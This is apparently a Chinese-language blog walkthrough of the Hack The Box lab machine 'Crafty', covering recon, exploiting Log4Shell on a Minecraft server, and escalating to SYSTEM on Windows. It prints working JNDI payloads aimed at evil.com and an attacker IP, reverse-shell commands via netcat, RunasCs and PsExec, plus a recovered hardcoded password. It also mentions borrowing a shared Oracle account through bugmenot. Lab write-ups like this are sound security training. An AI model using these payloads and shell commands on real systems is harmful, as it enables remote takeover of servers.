+++
date = '2025-07-20T16:32:58+08:00'
draft = true
title = 'HTB Crafty'
+++

这台靶机发布于2024年2月10日，windows靶机，HTB社区难度评级为easy。
首先在前期的信息收集环节中扫描到一个正在运行的Minecraft 1.16.5服务器，通过搜索了解到这个版本的Minecraft存在log4shell漏洞，通过这个核弹级漏洞得到了初始的立足点，
在后续的提权过程中，因为本身服务器是Windows10，juicy potato等常见的一些利用在这个版本的Windows中是不能运行的，通过内核提权不行的情况下，想到服务器本身运行Minecraft，这代表着一定存在Java程序，在系统中翻找之后找到一个Java插件，通过jd-gui反编译这个jar包，找到了一个可能的密码，通过这个密码尝试登录administrator用户，通过runascs.exe解决了cli执行runas时，因为UAC的原因无法输入密码的问题，至此已经得到administrator用户的shell
之后通过psexec配合nc，通过administrator用户执行psexec，从而将权限提升到nt authority\system，拿到整个系统的最高权限。

### Recon

```bash
ip=10.10.11.249
sudo nmap -sT --min-rate 10000 -p- $ip 
sudo nmap -sU --top-ports 20 crafty.htb -oA nmapscan/udp

sudo nmap -sT -sC -sV -O -p80,25565 $ip -oA nmapscan/details
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.11 seconds
```

扫描结果中有一条nmap没有自动跟随重定向，得到一个域名`crafty.htb`, 添加到hosts文件

```bash
sudo sed -i '1i 10.10.11.249 crafty.htb' /etc/hosts
```

### Web

80端口是一个mincraft服务器的介绍页面，商店，投票，论坛等内容都是coming soon状态，主页有一行`Join 1277 other players on play.crafty.htb`，查看一下play.crafty.htb有什么不一样的内容，并且根据这个信息可以尝试爆破一下http host头，查看是不是有其他的页面，这里对于UDP端口的扫描没有看到53端口开启, 所以应该不是基于子域名的分站点，大概率是vhost

```bash
gobuster vhost -u http://crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --append-domain -r -k -t 100
```

--append-domain: 将url添加自动添加到字典后
-r: 跟踪重定向
-k: 不进行tls验证

### Minecraft

端口25565是Minecraft游戏服务器的默认端口，包括nmap的扫描结果也显示了此处运行的是Minecraft 1.16.5版本，searchsploit当中只搜索到一个Minecraft启动器的潜在利用，并且版本还是1.6.61的

搜索之后找到Minecraft 1.16.5版本存在log4shell，这是一个发布于2021年的核弹级漏洞

#### log4shell

log4shell是一个log4j2框架存在的RCE漏洞，编号：**CVE-2021-44228**，影响 Apache Log4j 2 版本 `< 2.15.0`

##### log4j

log4j本身是一个Java的高性能日志框架，框架本身使用了JNDI这个Java提供的，用于Java程序访问命名服务(DNS, LDAP)的API接口

##### JNDI

JNDI是Java提供的基本API，用于让Java程序访问命名服务，JNDI存在注入，支持`${jndi:ldap://evil.com/x}`这样的语法，从而使得Log4j2解析日志时，解析了ldap地址的恶意内容，实现RCE


它的原理可以概括为：

> 利用 Log4j2 中对日志内容进行 **JNDI 动态解析** 的功能，注入恶意 LDAP 请求 → 远程加载并执行攻击者提供的 Java 类（字节码） → **完全控制目标服务器**。

##### 漏洞成因

log4j的lookups功能可以用来查找变量，比如`logger.info("User logged in: {}", "${java:version}")`，这样可以输出Java版本，但是它也支持使用`${jndi:ldap://evil.com/obj}`这样的写法来调用jndi并且通过ldap协议调，当这些内容被加入日志的时候，恶意代码立即执行

这也就意味着一切可以写入日志的行为都会触发这个漏洞，并且因为支持使用ldap这样的应用广泛的协议，比如windows AD域的实现，ldap协议就是其中关键的一环，基于此。log4shell影响范围之广，利用方式简单，并且可以称之为是核弹级的漏洞

##### 漏洞流程

```
攻击者发送 payload：
    ${jndi:ldap://attacker.com/Exploit}

↓ 被日志写入（如用户名、User-Agent、错误信息）

Log4j2 解析字符串中的 ${} → 调用 JNDI 解析

↓ JNDI 请求 ldap://attacker.com/Exploit

攻击者恶意 LDAP 服务器响应 → 返回包含远程类加载路径的对象

↓ Log4j 通过 Java 原生机制加载远程类（RCE）

攻击者代码执行成功
```

关于这个漏洞已验证的攻击面，可以查看这个[github仓库](https://github.com/YfryTchsGD/Log4jAttackSurface)

### exploit log4j

参考这篇medium的[博客](https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847)
[TLAUNCHER启动器](https://tlauncher.org/)

```bash
sudo apt install ./tlauncher-linux-installer.deb -y
```

在kali的start menu就可以启动tlauncher
选择release 1.16.5

#### Minecraft-Console-Client

tlauncher下载的太慢了，并且现在tlauncher是.deb包，设置代理不太方便，直接换用命令行工具[Minecraft-Console-Client](https://github.com/MCCTeam/Minecraft-Console-Client)

```bash
wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20250522-285/MinecraftClient-20250522-285-linux-x64
mv MinecraftClient-20250522-285-linux-x64 MinecraftClient && chmod +x MinecraftClient
sudo cp MinecraftClient /usr/local/bin
MinecraftClient
```

然后输入用户名，密码直接回车，输入靶机的IP地址即可连接

可以先做一下测试，ldap协议默认是389端口

```bash
sudo rlwrap -cAr nc -lvnp 389
```

```java
${jndi:ldap://10.10.14.25/test}
└─$ sudo rlwrap -cAr nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.249] 49682
0
0
0
 `
```

验证漏洞是存在的，那么现在找一个exploit直接利用即可

#### log4shell exploit

[log4j poc](https://github.com/kozmer/log4j-shell-poc)

```bash
git clone https://github.com/kozmer/log4j-shell-poc.git
python -m venv .
cd bin
source activate 
pip install -r  ../requirements.txt
```

需要安装一下java8，通过[bugmenot](https://bugmenot.com/view/oracle.com)网站直接拿一个现成的#Oracle账号

```bash
tar -zxf  jdk-8u202-linux-x64.tar.gz
```

这个poc会创建一个web服务器和ldap服务器，并且通过命令行参数指定反弹shell的端口，这个脚本默认是执行的`/bin/bash`，把它改成`powershell.exe`

```bash
sudo rlwrap -cAr nc -lvnp 9001

python3 poc.py --userip 10.10.14.25 --webport 8000 --lport 9001
${jndi:ldap://10.10.14.25:1389/a}
```

登录到Minecraft服务器，发送一下payload: `${jndi:ldap://10.10.14.25:1389/a}`即可得到反弹shell

### Privilege Escalation 

将.jar文件搬运到kali中，并反编译分析一下jar文件的内容。

```powershell
python /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username qolt -password pass@word!

net use \\10.10.14.25\share /user:qolt pass@word!

PS C:\users\svc_minecraft\server\plugins> copy-item .\playercounter-1.0-SNAPSHOT.jar \\10.10.14.25\share 

```

#### jd-gui进行java反编译

[jd-gui](https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.deb)
```bash
wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.deb
```

```java
public final class Playercounter extends JavaPlugin {
  public void onEnable() {
    Rcon rcon = null;
    try {
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
    } catch (IOException e) {
      throw new RuntimeException(e);
    } catch (AuthenticationException e2) {
      throw new RuntimeException(e2);
    } 
```

##### runascs进行显式登录

###### 尝试本地开启winrm

首先尝试当前的用户能不能开启winrm

```powershell
enable-psremoting -force
set-wsmanquickconfig -force
```

都是没有权限执行，那就尝试直接显式登录到administrator

通过`s67u84zKq8IXw`尝试登录administrator时，没有输入密码的机会，如果是gui界面可以解决，但是cli界面的话可以通过runascs来解决这个UAC的问题

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

unzip RunasCs.zip

iwr http://10.10.14.25/RunasCs.exe -outfile runascs.exe

rlwrap -cAr nc -lvnp 443
.\runascs.exe administrator 's67u84zKq8IXw' powershell -r 10.10.14.25:443 -t 0
```

-t 0: 背景运行，从而即使运行出错也不会阻塞当前shell

##### 提权到system32

使用microsoft的psexec程序，提权到system
[PsTools](https://download.sysinternals.com/files/PSTools.zip)
[nc64.exe](https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe)
```powershell
iwr http://10.10.14.25/PsExec64.exe -outfile PsExec64.exe

iwr http://10.10.14.25/nc64.exe -outfile nc64.exe

.\PsEXEC64.exe -accepteula -i -s cmd.exe /c "C:\programdata\apps\nc64.exe 10.10.14.25 443 -e powershell.exe"
```

`psexec`，`-i`参数指定交互式运行，`-s`指定以系统权限执行，通过psexec调用cmd.exe，在通过cmd.exe调用nc，再通过nc调用powershell从而得到反弹shell












